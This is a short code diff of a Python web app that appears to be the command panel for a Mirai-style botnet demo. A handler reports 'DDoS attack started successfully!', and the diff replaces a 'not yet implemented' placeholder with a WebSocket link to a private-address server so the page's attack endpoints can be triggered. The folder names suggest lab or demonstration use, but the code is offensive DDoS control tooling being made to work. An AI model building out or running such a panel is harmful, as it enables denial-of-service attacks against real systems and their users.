@@ -272,11 +272,16 @@ def handle_ddos_telnet(type, duration, target):
                 break
     return "DDoS attack started successfully!"
 
+import os
+
 @app.on_event("startup")
 async def background_tasks():
     """
     Starts background tasks for processing output queues.
     """
+
+    os.chdir("ReadMine-Mirai-Demo-Files/")
+
     for endpoint in clients_by_endpoint:
         asyncio.create_task(process_output_queue(endpoint))
 
@@ -331,8 +336,7 @@ async def get():
             <script>
                 function connect(endpoint) {
                     console.log(`Selected endpoint: /${endpoint}`);
-                    // Replace this with actual logic for handling the attack and inject
-                    alert("Attack endpoint functionality is not yet implemented.");
+                    const ws = new WebSocket(`ws://10.10.10.5:8000/ws/${endpoint}`);
                 }
 
                 function connectToDdos() {
